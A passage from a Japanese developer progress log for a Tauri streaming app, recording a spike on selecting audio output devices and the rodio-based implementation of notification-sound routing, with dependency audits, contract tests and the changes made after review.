  （24 文字以上の `[A-Za-z0-9_-]` のみからなる不透明文字列を無条件で伏せる。ただし SCREAMING_SNAKE_CASE の定数名は除外）を追加した。
- **変更**: ドキュメント **7 ファイルのみ**（`progress.md` / `task-board.md` / 057 / 057s / 057a / 057b / 057c）。**本体コード差分ゼロ・依存追加ゼロ・host-guard 未改変**
  （`git status --short -- apps/ package.json pnpm-lock.yaml` が空であることを確認済み）。

## 2026-08-03 (058s 音声出力デバイス指定スパイク：**結論＝② Rust 側再生**〔採る形は「②-軽」＝通知音だけ `rodio`〕)

「通知音・VOICEVOX 読み上げを**配信に載せる／載せない**で切り替える」方式を実測で確定させるスパイク（本実装 058a/058b はしない）。
結論は 3 択のうち **② Rust 側再生**で、採る形は本人決定（2026-08-03）で **②-軽**＝**通知音（059）だけ Rust（`rodio`）で鳴らして
出力デバイスを指定し、読み上げは Web Audio のまま無改変**。検証は**リポジトリ外**（DevTools スニペットと `cargo new` した
使い捨て Rust プロジェクト）で行い、**本体コード・依存は未改変**。アプリの起動・OBS 操作・耳での確認・OS の出力デバイス切替は本人が担当。
実測値の正は [058s](tasks/058s-audio-output-device-spike.md) の「スパイク結果」節。

- **実測環境**: macOS **14.6.1 (23G93)** / Apple Silicon / Rust **1.95.0** / OBS **32.2.1**、Windows **NT 10.0 x64（実機）**。
  webview は macOS＝**WKWebView**（UA `AppleWebKit/605.1.15`）／Windows＝**WebView2 Chromium 150**。
  検証用 crate は `rodio` **0.22.2** / `cpal` **0.17.3**（スクラッチパッド側のみ）。
- **① Web 側（`setSinkId`）＝ ✕。両 OS で成立せず、しかも詰まっている場所が違う**:
  - **macOS**: `navigator.mediaDevices` が**そもそも存在しない**（`enumerateDevices` も `setSinkId` も `undefined`）。
    `createMediaStreamDestination` はあるが `setSinkId` が無いので**要素経由の回避策も成立しない**。
  - **Windows**: `AudioContext.setSinkId` / `HTMLMediaElement.setSinkId` は **`function` として存在する**のに、
    `enumerateDevices` が **`deviceId` も `label` も空文字の 1 件**しか返さない＝**渡せる ID が無く選べない**。
    ⚠ **「API は存在した」を「切り替えられる」と読むと誤判定する典型**で、判定条件に「label が取れること」を
    入れておいたことがそのまま効いた。
  - `selectAudioOutput` は**両 OS とも `undefined`**。＝ **マイク権限を取らずに label を得る手段は現時点で存在しない**
    （`getUserMedia` は本スパイクを通じて一度も呼んでいない）。
- **③（機能を出さない）は不採用**: (5) の OBS アプリ単位キャプチャは**そのプロセスの音を丸ごと**拾うため
  **読み上げと通知音を区別できない**。「読み上げを載せる」を選ぶと**通知音も必ず載る**。
  本人の判断＝「載せるかを選べるならよいが、**それで結果的に通知音が載るなら保留はダメ**」。
- **(5) OBS の実態**: **macOS ✅**（「アプリケーション音声キャプチャ」で StreamDock を選べば拾え、
  デスクトップ音声をミュートした状態で**別アプリの音では振れない**＝排他性も確認）。
  **Windows ⚠**——`StreamDock` を選んでも振れず、**`Microsoft Edge WebView` を選ぶと振れる**（アプリ再起動もまたぐ）。
  原因は Windows の音量ミキサーで確認でき、**音声セッションの持ち主が `msedgewebview2.exe`**。
  ⚠ ⚠ を付けたのは技術ではなく**案内の質**の問題（名前が StreamDock でないうえ、他の WebView2 アプリの音も乗りうる）。
- ⚠⚠ **`tauri dev` では (5) を判定できなかった（macOS）**: dev で走るのは `target/debug/stream-dock` という**素の実行ファイル**で
  **bundle identifier を持たない**ため、OBS がアプリ選択を保存できず**OK を押すと空に戻る**。
  `tauri build --debug` の `StreamDock.app`（`com.tetsuya.stream-dock`）に替えた瞬間に解決した。
  → **「dev で動かない」を「製品で動かない」の証拠にしてはいけない。** 057s の教訓（自分の環境で動いた＝配布可否ではない）の**実行形態版**。
- **(3)(4) ＝ ✅**: `rodio` から**仮想オーディオデバイスを指定して再生**すると、**既定デバイスからは鳴らず**、
  **OBS の「音声入力キャプチャ」でその仮想デバイスを選んだソースのメーターが振れた**（＝「載せる」側の経路が成立）。
  仮想デバイスは耳で聞こえないので「聞こえない」だけでは「どこにも出ていない」と区別できず、**OBS のメーターがその区別を与えている**。
- **② の依存コスト（実測）**: 直接依存は **`rodio` 1 本**。**`default-features = false, features = ["playback","wav"]` が必須**
  （⚠ 既定のままだと symphonia 一式で **126 crate**）。実際に入るのは **macOS 39 / Windows 38**。
  **`tokio` / `async-std` / `futures-executor` を 1 つも引かない＝「Rust は完全同期のまま」の方針を破らない**。
  `cargo audit` は **exit 0**（脆弱性 0・警告 0）。⚠ `rodio::speakers` は `experimental` feature 配下なので使わず、
  **cpal 列挙＋`DeviceSinkBuilder::from_device`** の安定 API を使うこと。
- **① が詰んだ理由がそのまま ② の長所**: webview は権限が無いと `label` も `deviceId` も空しか返さないのに対し、
  **Rust は権限なしでデバイス名と、cpal が「再起動・再接続をまたいで持続する」と明記する安定 ID（`DeviceId(HostId, String)`）を返す**。
  「ユーザーが出力先を選べる」という機能の前提条件は Rust 側にしか存在しない。
- **なぜ ②-フルではなく ②-軽か**（本人決定）: ②-フル（読み上げも Rust 再生）は読み上げにもトグルを付けられるが、
  代償が **`ttsQueue` の再生経路の全面移設**（WAV の IPC 受け渡し＋直列制御と再生完了通知の作り直し）。
  **050 でハング対策を入れたばかりの最も繊細な箇所を書き換える**ため退行リスクが高い。
  ②-軽なら `ttsQueue.ts` / `voicevox.ts` / `voicevoxPreview.ts` は**無改変**で、通知音は新規実装なので**移設ですらない**。
  ⚠ **代わりに「読み上げを載せない」は選べない**（要望②のトグルは出せない）＝ **058b は保留**。
- **②-軽の運用**: 読み上げ＝Web Audio → **OS 既定（仮想デバイス／複数出力装置）** → 載る。
  通知音＝**Rust から実デバイスを明示指定** → 載らない・本人には聞こえる。
  OBS 側は**アプリ単位キャプチャではなく仮想デバイスの「音声入力キャプチャ」**にする（アプリ単位はデバイス指定を無視するため両立しない）。
  ⚠ **ユーザーに仮想オーディオデバイスの導入と OBS の構成変更を求めることになる**（058a/059 の UI に案内が必須）。
- **成果物（ドキュメントのみ）**: [058s](tasks/058s-audio-output-device-spike.md)（末尾に**スパイク結果＋決定メモ＋058a の実装スコープ＋
  security 方針の差分ドラフト**〔§10 `rodio`／§4 デバイス列挙と再生／§9／§1〕・状態行を「完了」へ）／
  [058](tasks/058-stream-audio-routing.md)（**覆った前提 2 点**を状態行に明記）／[058a](tasks/058a-audio-routing-foundation.md)（**内容は変更せず**
  状態行に「① 前提のため着手時に書き直しが要る・層が Rust へ移り security-review 必須」）／[058b](tasks/058b-voicevox-stream-output-toggle.md)（**保留**）／
  [059](tasks/059-notification-sounds.md) [059a](tasks/059a-comment-notification-sound.md) [059b](tasks/059b-monetary-notification-sound.md)（**再生層が Rust に変わる申し送り**）／
  [task-board.md](task-board.md)（058 に結論 1 行・059 の実装順を **058a → 059a → 059b** に修正）／本エントリ。
  **[security.md](security.md) は未編集**（正式追記と security-review は 058a で行う＝本スパイクの責務はドラフトまで）。
- ⚠ **Windows 未検証（申し送り）**: rodio の実再生／仮想デバイス運用／**バンドル版での (5)**（`StreamDock.exe` なら拾える可能性は残る）。
  098 か 058a 着手時に実測すること。**058a には「Windows 未検証」の注記を残す**（013/019/021/028 と同じ作法）。
- ⚠ **手順上の落とし穴（記録）**: Windows の Chromium 系 DevTools は**コンソールへの貼り付けを既定で拒否**する（self-XSS 警告）。
  `allow pasting` は**警告が出ている最中にだけ**受け付けられ、それ以外のタイミングで打つと `Unexpected identifier` になる。
  **Sources → Snippets は貼り付け保護の対象外**なので、長いスニペットはそちらが確実。
  また Windows では `before*Command` の `pnpm check:sidecar` が **Windows 用 sidecar 未生成（098 未完了）**で落ちるため、
  sidecar を必要としない経路で検証した（音を鳴らすのは webview であってコメビュ窓である必要すら無い）。
- **やらないこと（線引き）**: 本実装（058a/058b）・検証コードの本体マージ・依存の本採用・`security.md` 本体の編集・
  通知音そのものの追加（059）・コミット/プッシュ（**本人の明示指示待ち**）。
- **変更**: ドキュメント **9 ファイルのみ**（`progress.md` / `task-board.md` / 058 / 058s / 058a / 058b / 059 / 059a / 059b）。
  **本体コード差分ゼロ・依存追加ゼロ**（`git status --short -- apps/ package.json pnpm-lock.yaml
  apps/desktop/src-tauri/Cargo.toml apps/desktop/src-tauri/Cargo.lock` が空であることを確認済み）。
  ⚠ `apps/desktop/src-tauri/target/debug/bundle/` に検証用の debug ビルド（`StreamDock.app` / `.dmg`）が残っているが
  `target/` は gitignore 済み。なお `tauri build --debug` は最後に **updater の署名鍵が無いというエラーで非ゼロ終了する**が、
  `.app` と `.dmg` はその手前で生成済み（本スパイクには無関係）。

## 2026-08-04 (058a 音声ルーティング基盤 —— 通知音を Rust〔`rodio`〕で鳴らし**出力デバイスを明示指定**する②-軽の土台)

- **やったこと**: [058s](tasks/058s-audio-output-device-spike.md) の結論「②-軽」に沿って
  [058a](tasks/058a-audio-routing-foundation.md) を**全面的に書き直したうえで実装**した。
  出力デバイスの**列挙**と**指定デバイスでの再生**を Rust（`rodio`）に置き、設定 UI で選ばせて localStorage に永続化する。
  **`ttsQueue.ts` / `voicevox.ts` / `voicevoxPreview.ts` は無改変（差分ゼロを実測）**＝読み上げ経路には一切触れていない。
- **①音源アセットをどう扱ったか（B/C の決定）＝ Rust でトーンを合成する（同梱ファイルゼロ）**:
  058s は `play_notification_sound`（同梱音源 ID の enum）を 058a のスコープに入れているが、
  **通知音そのものの追加は 059 の領分**で、058a の時点で鳴らす音が存在しないという問題があった。
  選択肢は (a) Rust でトーン生成 (b) 最小 WAV を `include_bytes!` で同梱 (c) 再生を 059 へ譲る の 3 つ。
  **(a) を採用**（本人決定）。理由:
  - 058s のスパイクが**正弦波で検証した経路そのもの**を本番にできる。
  - `bundle.resources` も `include_bytes!` も要らない＝**`tauri.conf.json` 差分ゼロ・ファイル I/O ゼロ・パス解決ゼロ**。
    「frontend からパスを渡させない」より強く、**パスという概念が経路上に存在しない**（§4 の面が最小になる）。
  - ライセンス確認の論点が 058a に発生しない（059 の責務のまま残る）。
  - **副次効果が大きかった**: decoder が不要になり `wav` feature を落とせた（下記④）。
  - (c) を採らなかったのは、**鳴らせる音が 1 つも無いと 058s の合格基準
    「選んだデバイスで鳴る」＋「既定デバイスでは鳴らない」を 058a 単体で測れない**ため。
    `rodio` を `Cargo.toml` に足して security-review を通すのに、再生経路が 1 行も無い状態になるのも筋が悪い。
  - **テスト再生ボタンを設定 UI に置いた**（034c の話者試聴ボタンと同じ考え方）。これが 058a の唯一の検証手段。
  - 059 へは「音を増やす 3 つの道」（トーン合成を続ける／`include_bytes!` で**生 PCM**／WAV 同梱〔+symphonia〕）を
    058a に明記して申し送った。**前 2 者は decoder ゼロのまま増やせる。**
- **②`OutputStream` のライフサイクルと `Send`/`Sync` の解き方 ＝ State に持たず、再生のたびに開いて閉じる**:
  - `MixerDeviceSink` は内部に `cpal::Stream` を持つ。これを `app.manage` すると
    `Mutex<MixerDeviceSink>` が `Sync` であるために `MixerDeviceSink: Send` が要る、という話になる。
    **State を持たなければその話自体が発生しない**ので、そちらを選んだ。
  - 他の利点: ①音声デバイスを掴みっぱなしにしない ②**毎回デバイスを解決し直すので「抜かれた」を再生時点で必ず検出できる**
    （キャッシュしていると「もう無いデバイス」へ鳴らし続ける）。
  - **完了まで待つのは選択ではなく帰結**。`MixerDeviceSink` を drop するとストリームが閉じて音が切れるので、
    開きっぱなしにしない以上 待つ以外にない。副産物として invoke の Promise 解決＝再生完了通知になり 059 が使える。
  - **`#[tauri::command(async)]` ＋ 同期 fn**（窓生成コマンドと同型）。同期コマンドはメインスレッドで走るので、
    再生完了まで待つと UI が固まる。⚠ **ここを同期に戻さないこと。**
    tokio は Tauri v2 が既に持っているので**新規依存にならない**＝「Rust 完全同期」方針は破っていない。
  - ⚠ **`Player::sleep_until_end()` は使わない**（内部でチャネル受信を無期限に待ち、ストリームが死ぬと戻らない
    ＝invoke の Promise が永久未解決になる）。合成した音の長さは自分で知っているので、`player.empty()` を
    **`音の長さ + 1 秒` の期限つきでポーリング**する（050 の再生ストール監視と同じ発想＝最初から上限を持たせる）。
  - `Send` 自体はコンパイラが強制しない（await を跨がないため）が、**tripwire として `const _: fn() = ...` の
    コンパイル時アサートを置いた**——rodio/cpal の更新でこの性質が崩れたら実行時ではなく `cargo check` で落ちる。
    実測: macOS は `Stream { inner: Arc<Mutex<StreamInner>>, _disconnect_manager }` でソースに
    「dedicated thread architecture ensures Stream can implement Send」と明記、Windows(WASAPI) は `unsafe impl Send`。
  - **多重再生・クールダウン・排他は 058a では持たない**（1 呼び出し 1 再生で独立）。
    059b が「音源ごとに独立したクールダウン」を要求しているので、状態は 059 側に置くのが正しい。
- **③フォールバック時に UI で気付かせる仕組み ＝ fail-closed（鳴らさない）＋ 3 段の気付き**:
  - ⚠ **旧 058a（① 前提）の判断を意図的に反転させた。** 旧文は「音が鳴らなくなるより、意図と違うデバイスから
    鳴るほうがマシ」だったが、それは**読み上げ**の理屈（配信中の無音が事故）。**通知音では逆転する**——
    ②-軽の運用では **OS 既定＝仮想オーディオデバイス＝配信に載る側**なので、既定へ落とすと
    **「載せないつもりの通知音が配信に載る」＝この機能の存在理由そのものが壊れる**。
    鳴らないのは軽微な不便で、載るのは事故。**Rust も frontend も同じ向きに揃えた。**
  - Rust: `find_output_device` が**現在の `output_devices()` を舐めて ID を照合**し、無ければ
    `AppError::audio_device_unavailable()`（既定へ落ちる分岐そのものが存在しない）。
    ⚠ `HostTrait::device_by_id()` は使わない（内部で `devices()`＝**入力を含む全件**を舐めるため）。
    出力一覧を自分で舐めれば「存在する」と「出力である」が 1 回の検査で済み、**再生経路が入力デバイスへ構造的に到達しない**。
  - UI（3 段）: ①**設定を開くたびに列挙し直して突き合わせ**、保存済み ID が無ければ赤字で警告
    ②「再読み込み」ボタンで再列挙 ③テスト再生の失敗表示。⚠ 列挙中（`loading`）は警告を出さない
    （起動直後に必ず一瞬赤くなるため）。⚠ **保存済み ID は消さない**（挿し直せば復帰する）。
  - ⚠ **警告文にデバイス名・ID を出さない**（§9）。「以前選んだ音声出力デバイス」で特定せずに済ませる。
  - ホットプラグ監視（着脱イベント購読）は入れていない。上記 3 段で「黙って載る側に倒れる」は防げるため。
- **④`cargo tree` の実測値と `cargo audit` の結果**:
  - **⚠ 058s の指示に対する訂正 1**: 058s は `features = ["playback","wav"]` を指示していたが、
    rodio 0.22 の `wav` は **`["symphonia-wav", "symphonia-pcm"]` の別名**で、足すと symphonia 一式が入る。
    **トーン生成なら decoder は一切不要**（`SineWave` / `SamplesBuffer` / `Player::connect_new().append()` は
    いずれも feature gate されていない。decoder が要るのは `rodio::play(mixer, reader)` だけ）。
    → **`default-features = false, features = ["playback"]`** に絞った。
    実測 **`cargo tree -i symphonia` が「該当パッケージなし」**（058s の確認コマンド案は OK を出さない設計だった）。
  - **⚠ 訂正 2**: `cargo tree -i tokio` は**「引いていない」の担保に使えない**——tokio は Tauri v2 が既に保持しているので
    必ずヒットする。正しい担保は **`cargo tree -p rodio --edges normal` に async ランタイムが現れないこと**（実測 OK）。
  - **crate 純増は 11 件**（macOS・ユニーク解決後で **315 → 326**）:
    `rodio` / `cpal` / `coreaudio-rs` / `dasp_sample` / `mach2` / `num-rational` / `num-bigint` / `num-integer` /
    `objc2-audio-toolbox` / `objc2-core-audio` / `objc2-core-audio-types`。
    objc2 系の大半・`thiserror` / `libc` / `bitflags` は Tauri が既に持っているので増分に入らない。
    ⚠ 058s の「macOS 39 / Windows 38」は**使い捨てプロジェクトで測った総数**であって本体への増分ではない。
  - **`cargo audit` は exit 0**（Cargo.lock 577 crate 走査）。**今回増えた 11 crate に advisory は 1 件も無い**
    （既存の警告 18 件＝GTK/glib 等 Linux 専用の unmaintained/unsound は不変）。
- **⑤Windows で未検証の項目**（058s の実測は macOS のみ・098 も未完了。013/019/021/028 と同じ作法で注記を残して進めた）:
  1. **デバイス名が読める文字列で並ぶか**（WASAPI の `description()` が空・記号だけにならないか）
  2. 選んだデバイスからテスト音が鳴る／既定デバイスからは鳴らない
  3. **アプリ再起動後も選択が復元されるか**（＝WASAPI で `DeviceId` が安定するか。**Windows 最大の未検証点**）
  4. デバイスを OS から抜く → 警告が出て、既定へ落ちずに鳴らない
  5. 仮想オーディオデバイス（VB-CABLE 等）を入れて ②-軽の運用が成立するか
  6. **依存の実増分**。⚠ **cpal 0.17 は `windows` crate を `>=0.59, <=0.62` で要求するが、本 crate は 028 の
     Win32 コードで `windows = "0.58"` を固定している**＝**Windows ビルドでは `windows` crate が 2 系統並ぶ**見込み。
     上記「11 crate」は macOS の実測値であって Windows の増分ではない。統一は 028 のコードに手が要るため 098 へ送る。
- **セキュリティ（[security.md](security.md) に正式追記）**: §4 追補（列挙は出力のみ・**入力に触れない**・
  単一目的コマンド 2 本・任意パスを受けない・ID は Rust 側で照合・**fail-closed**・ストリームを State に持たない）／
  §9 追補（**デバイス名/ID をログ・エラー・UI に出さない**。コマンドが `DbState` を取らないので
  app_logs へ到達する経路が構造的に無い）／§10（`rodio` の追加理由・feature を絞る根拠と上記の訂正・
  crate 純増 11・tokio を引かない・audit exit 0・`rodio::speakers` を使わない・`cpal` を直接依存にしない）／
  **レビュー必須条件に「音声デバイスの列挙・音声の再生」を追加**（入力へ広げる／enum 以外で音を指定する／
  既定へフォールバックする、の 3 変更を名指しで該当と書いた）。
- **テスト**: 環境依存で単体テストできない部分（デバイス列挙・実再生）は
  **`include_str!` の契約テスト**で不変条件を機械的に固定した（`obs_config` / `app_update` の先例と同型）。
  ⚠ 自己ヒットを避けるため **`#[cfg(test)]` 以降を切り落とし＋行コメントを剥がし＋needle は `format!` で実行時に組む**。
  - `never_falls_back_to_the_default_output_device`（`default_output_device` / `from_default_device` /
    `open_default_sink` / `open_sink_or_fallback` の不在）
  - `never_touches_input_devices`（`input_devices` / `default_input_device` / `build_input_stream` /
    `microphone` / `.devices(` の不在）
  - `has_no_panicking_paths`（`unwrap()` / `.expect(` / `panic!(` の不在）
  - `accepts_no_file_path_from_the_frontend`（`PathBuf` / `include_bytes!` / `std::fs` の不在）
  - 純関数（波形合成）は Rust で 3 本、`audioOutputPrefs` は vitest で 16 本、設定 UI は 16 本。
  - **ミューテーションで実効性を確認済み（8 件すべてレッド）**: ①`find_output_device` に既定へのフォールバックを足す
    ②`output_devices()` を `input_devices()` に変える ③エンベロープを外す（クリップ・クリックノイズ）
    ④`isValidAudioOutputDeviceId` の空文字判定を反転 ⑤「見つかりません」警告を出さなくする
    ⑥未選択でもテスト再生を押せるようにする。
- **変更ファイル**: Rust＝`Cargo.toml`（理由コメント）／`src/audio/`（`mod` / `model` / `service` / `commands` 新規）／
  `src/error.rs`（`AudioDeviceUnavailable` / `AudioPlaybackFailed` ＋引数を取らないコンストラクタ 2 本）／`src/lib.rs`（登録 2 行）。
  frontend＝`audioOutputApi.ts` / `audioOutputPrefs.ts`（新規）＋テスト 2 本＋bindings 2 本（ts-rs 生成）／
  `CommentViewerApp.tsx` / `SettingsView.tsx`（設定カード）／`SettingsView.obs.test.tsx`（`baseProps` に新 props）。
  docs＝`058a`（書き直し）/ `security.md` / `progress.md` / `task-board.md`。
- **ゼロ拡大の実測**: `capabilities/` / `tauri.conf.json` / `.github/` / `apps/comment-sidecar/` /
  `package.json` / `pnpm-lock.yaml` / **`CommentViewerApp.module.css`（CSS 差分ゼロ）** /
  `ttsQueue.ts` / `voicevox.ts` / `voicevoxPreview.ts` がすべて差分ゼロ。`csp: null` 不変・外部通信ゼロ。
  設定カードは**既存クラスだけ**で組んだので 054 の書式規則（項目名 13px/700・説明 `--muted`）に自動的に従い、
  `check-css-guards.mjs` の (6)(7) にも触れていない。
- **検証**: `cargo check` / `cargo test`（**146 passed**・うち 058a の新規 10 本＝契約 4・波形 3・ts-rs export 2・
  `AppError` 1）/ `typecheck` / `lint` / `pnpm test`（**628 passed**・うち 058a の新規 36 本＝prefs 20・設定 UI 16。
  CSS guard OK・version sync OK）/ `cargo audit` exit 0。
- ⚠ **実機確認は未実施**（本人の手番）。`tauri dev` で「選んだデバイスから鳴る」＋「既定デバイスからは鳴らない」の
  2 点セット、OBS の音声入力キャプチャで仮想デバイスを選んだとき**読み上げは拾えて通知音は拾えない**こと、
  デバイスを抜いたときの警告、ライト/ダーク両テーマを確認すること。
- **やらないこと（線引き）**: 通知音そのもの・クールダウン・排他（059）／読み上げのルーティング（058b＝保留）／
  音量調整・正規化・ダッキング／仮想オーディオデバイスの自動導入（**案内文言のみ**）／ホットプラグ監視／
  `windows` crate のバージョン統一（098 へ）／コミット・プッシュ（**本人の明示指示待ち**）。

### 2026-08-04 追記: security-review / code-review の指摘反映（058a）

別セッションで security-review ＋ code-review（effort high）を実施し、指摘を反映した。**セキュリティ上の欠陥は
検出されず**（fail-closed・enum による型レベル封鎖・Rust 側照合・`DbState` 非取得・音源ファイル不在はすべて
実コードで成立を確認）、指摘は「一貫性の穴」と「文書の事実誤り」に限られた。

- **① `audioOutputPrefs.test.ts` に生の NUL バイトが入っていた**（修正）。`localStorage.setItem` の引数が
  エスケープではなく**リテラルの U+0000 バイト**で、git がファイル全体を binary 判定していた
  （`Bin 0 -> 5940 bytes`）。＝**このファイルは以後どの `git diff` にも内容が出ない**＝差分ベースのレビュー運用
  （security-review / code-review / PR）の網から構造的に外れる。エスケープ表記へ置換し、テキスト（143 行）として
  diff に出ることを確認した。テストの入力値（NUL）そのものは変えていない。
- **② 列挙とコマンド検証の不一致を解消**（修正）。`play_notification_sound` は受け取った ID を `trim()` ＋
  制御文字拒否してから**完全一致**で照合するのに、`list_output_devices` はその正規化に耐えない ID も返しうる状態
  だった。＝**UI には出て選べるのに再生時に必ず失敗する**デバイスが理論上作れる（fail-closed 方向なので危険では
  ないが、直しようのない不便になる）。列挙側で落として「**一覧に出るなら必ず鳴らせる**」を不変条件にした。
  ⚠ Rust の `char::is_control` は U+0080..=U+009F も含み frontend 側の判定より広いので、**広いほうに合わせた**。
- **③ ⚠⚠ `#[tauri::command(async)]` が tokio worker をブロックする件に構造的な上限を入れた**（修正）。
  レビューで tauri のソースを確認した結果、自己レビューの見立てが**事実であると裏付けられた**——`tauri-macros`
  の tracing ラベル `"sync_threadpool"` は**ラベル文字列にすぎず**（`command/wrapper.rs:264`）、実体は
  `tauri/src/ipc/mod.rs:329` の `respond_async` → **`async_runtime::spawn`**（`spawn_blocking` ではない）で、
  `async_runtime` は tokio のマルチスレッドランタイム（`async_runtime.rs:223`）。＝**再生が終わるまで worker を
  1 本占有する**。窓生成コマンドや `check_app_update` / `install_app_update` と同じランタイムを共有する。
  058a 単体では実害が無いが、**059 がコメント受信ごとに呼ぶ**ため「059 が正しくクールダウンを実装すること」に
  可用性を賭ける形になっていた。→ `service::PLAYING` / `PlaybackGuard`（`AtomicBool` の RAII ガード）で
  **同時再生を 1 本に制限**した。競合時は**エラーにせず鳴らさずに `Ok(())`**（新しいエラー面を増やさない・
  059 の投げっぱなし導線と噛み合う）。⚠ **これはクールダウンの代わりではない**（クールダウンは 059 の責務）。
  契約テスト `only_one_playback_runs_at_a_time` で固定。
- **④ 再生末尾が最大 50ms 切れうる問題を修正**（修正）。`Player::empty()` が見るカウンタは `Done` ラッパが
  **内部ソースを消費し切った**ときに減るもので、消費しているのは cpal のデータコールバック。
  `DeviceSinkBuilder::from_device()` は buffer_size を **50ms 相当**に固定する（rodio 0.22 の
  `// aim for 50ms of audio`＝`sample_rate / 20`）ため、`empty()` が true になった時点で**まだ最大 50ms 分が
  未再生のままキューに残っている**。そこで `sink` を drop するとその分が破棄される
  （180ms・tau=60ms のテスト音だと打ち切り位置の振幅はピーク比 11% 程度＝クリックになりうる）。
  `PLAYBACK_TAIL = 80ms` の post-roll を追加した。⚠ **実機（特にヘッドホン）で末尾を聴いて確認すること。**
- **⑤ 契約テストに「在ること」の検査を追加**（修正）。従来は禁止 API の**不在**しか見ておらず、
  ⓐ `require_non_empty` / `reject_control_chars` の削除 ⓑ `#[tauri::command(async)]` → 同期 ⓒ `DbState` の追加
  ⓓ `audio/` へのファイル追加（検査対象から漏れる）がすべてすり抜けていた。`assert_present_in` を追加し、
  `validates_the_device_id_before_using_it` / `both_commands_stay_off_the_main_thread` /
  `commands_take_no_db_state` / `the_contract_covers_every_file_in_the_audio_module` の 4 本を新設
  （⑤＋③で **Rust 146 → 151 passed**）。
- **⑥ `<details>` の案内文が 1 段落に潰れていた**（修正）。`.note` は `font-size`/`line-height`/`color` のみで
  `display` を持たず、カード直下で改行されて見えるのは `.cardBody` が `display:flex; flex-direction:column`
  ＝**フレックスアイテムが blockify される**からだった。`<details className={styles.obsPasswordHelp}>` は
  flex ではないので `<span>` のままだと 3 段落が**空白すら無しに連結**する（JSX は要素間の改行を除去する）。
  `<div>` へ変更＝**CSS 差分ゼロのまま**解決（`.errorText` を `<div>` で使う前例と同型）。
- **⑦ 文書の事実誤りを訂正**（修正）:
  - **crate 数の書き分け**: `Cargo.lock` **追加 16 件・削除ゼロ** ／ macOS ビルドツリー**純増 11 件**
    （315→326）。差の 5 件（`alsa` / `alsa-sys` / `ndk-context` / `num-derive` / `objc2-avf-audio`）は
    Linux/Android/iOS 専用で darwin ツリーに現れないことを実測確認。⚠ **`cargo audit` は lock 全体を読む**ので
    「今回増えた 11 crate に advisory 無し」は根拠と主張がずれていた（正しくは 16 件）。§10 で両方を書き分けた。
  - **⚠ `windows` crate の記述が誤りだったので訂正**: 「058a のせいで 2 系統並ぶ」と書いていたが、
    `cargo tree --target x86_64-pc-windows-msvc -i windows` の実測は **0.58.0〔自前・028〕/ 0.61.3〔tao→tauri〕/
    0.62.2〔cpal〕の 3 系統**。**0.58 と 0.61.3 の併存は 058a 以前からの状態**で、058a が足すのは
    **3 本目の 0.62.2 だけ**だった（HEAD の lock にも `windows 0.62.2` はあるが、参照元は macOS 限定ターゲット
    依存の `sysinfo` なので Windows ビルドツリーには入っていなかった）。⚠ さらに 0.x 同士は semver 非互換で
    cargo が決して統合しないため、**「統一」は 098 でも達成できない**（028 を 0.62 へ上げても tao の 0.61.3 が
    残る＝到達点は 3→2）。098 で判断するのは統一の可否ではなく**重複コストの許容可否**である。
    このまま渡すと 098 に存在しない目標を持たせることになるため、`Cargo.toml` / `security.md` / `058a` /
    `task-board` の 4 か所を訂正した。
- **⑧ 059 への申し送りを 2 点修正**（修正）:
  - ⚠ **`.catch(() => {})` で握り潰す導線を反転**。058a は fail-closed かつ**ホットプラグ監視を持たない**ので、
    無言で捨てると**配信中にデバイスを抜いたとき通知音が鳴らなくなったことに気付く手段がゼロ**になる。
    「鳴らないほうがマシ」は「鳴らないことに気付けなくてよい」ではない。`AUDIO_DEVICE_UNAVAILABLE` を受けたら
    **画面に継続表示される indicator を出す**ことを 059 の要件として明記した。
  - **「音を増やす道②（`include_bytes!` で生 PCM）」が 058a 自身の契約テストに禁止されていた**
    （`accepts_no_file_path_from_the_frontend`）。推奨した道をそのまま実装すると `cargo test` が落ちる状態
    だったので、「採るなら needle を外し `PathBuf` / `std::fs` / 実行時パス解決の不在で守り直す」ことを注記した
    （守りたいのは「frontend から任意のパス／バイト列を受け取らない」であって、コンパイル時に確定する
    `include_bytes!` はその対象ではない）。
- **`open_sink_or_fallback` の禁止理由を分離**（修正）。あれは**既定デバイスへは落ちず**、同一デバイス上で
  別の supported config を試すだけなので、`default_output_device` 等と同じ失敗メッセージにすると将来の実装者を
  誤誘導する。禁止自体は維持（失敗の意味を単純に保つため）だが、理由を別立てにした。
- **`SAMPLE_RATE` / `sleep_until_end` のコメントを訂正**（修正）。前者は「0 を書いたらコンパイルエラー」と
  書いていたが実際は `SampleRate::MIN`（1Hz）へ**静かに縮退**する（検出は波形テストが担う）。後者は
  「ストリームが死ぬと戻らない」と書いていたが、**sink を drop した場合は `recv()` が即 `Err` で戻る**——
  本当に戻らないのは**デバイスが stall した**ときで、上限つき待機はそのために load-bearing である。
- **修正不要と判断してコメントだけ残したもの**（意図・理由・再修正トリガーを該当箇所に記載）:
  ⓐ 契約テストのコメント剥がしが `//` 限定でブロックコメント非対応（誤検知方向にしか倒れない）
  ⓑ `SettingsView.audio.test.tsx` の `baseProps` 重複（共通化すると片方の既定値変更が他方を巻き添えにする）
  ⓒ `refreshAudioOutputDevices` のアンマウント後 setState（`CommentViewerApp` は窓のルート相当で
  アンマウントされない・React 18 は警告も出さない）
  ⓓ `.obsPasswordHelp` を汎用 `<details>` として流用している点（CSS 冒頭の書式表が `.note` と並べて
  「補助説明」役割で定義しているクラスなので書式規則どおり。3 箇所目が出たら `.helpDetails` へ改名）。
- **検証**: `cargo test` **151 passed**（146 + 新規 5）／`pnpm typecheck` / `lint` / `pnpm test` **628 passed**
  （CSS guard OK・version sync OK）／ゼロ拡大の再実測（`capabilities/` / `tauri.conf.json` /
  `CommentViewerApp.module.css` / `ttsQueue.ts` / `voicevox.ts` / `voicevoxPreview.ts` / `package.json` /
  `pnpm-lock.yaml` がすべて差分ゼロ）。
- ⚠ **実機確認は引き続き未実施**（本人の手番）。上記に加えて **④の末尾（ヘッドホンでクリックが出ないか）**と
  **⑥の案内文（3 段落に見えるか）**を確認すること。

### 2026-08-04 追記: 058a のテスト補強（write-tests）

レビュー反映後、**「ユニットで固定できるのに固定していない仕様」**を洗い出して追加した。
実機でしか確かめられないもの（実デバイスからの発音・OBS への載り方・テーマ）は E2E 手順として残した。

- **Rust +2 本（152 → 154）**:
  - `append_makes_the_player_non_empty_right_away` — `wait_until_finished` は `Player::empty()` に依存する。
    `append` がカウンタを**同期的に**増やさないと、直後の `empty()` が true になって**一度も鳴らないまま抜ける**。
    rodio 更新でこの性質が崩れたら落とす。実デバイス不要（`rodio::mixer::mixer()` で OS に繋がらない mixer を作る）。
  - `waiting_for_playback_always_has_an_upper_bound` — **058a の可用性の要**。`MixerSource` を消費しない
